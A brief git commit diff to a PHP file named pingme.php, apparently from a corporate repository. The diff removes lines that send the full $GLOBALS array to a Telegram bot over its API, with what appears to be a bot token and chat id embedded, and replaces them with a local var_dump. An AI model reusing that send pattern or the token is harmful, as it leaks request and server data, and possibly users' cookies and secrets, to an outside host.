a6c968f81fa37802b3f52d67748d6b7fcd09f1c1
Ivan Kazakov <i.kazakov@corp.badoo.com>
2017-05-04 18:51:36 +0300

    tt

--- pingme.php
+++ pingme.php
@@ -5,6 +5,4 @@
  * Date: 04.05.17
  * Time: 10:07
  */
-file_get_contents("https://api.telegram.org/bot3116".
-    "26585:AAENuUL1PDtO9YuYxYKYbSWPFzAghgLTa4U/sendMessage?chat_id=71086029&text=".
-    "headers:".url_encode(var_export($GLOBALS)));
+var_dump($GLOBALS);
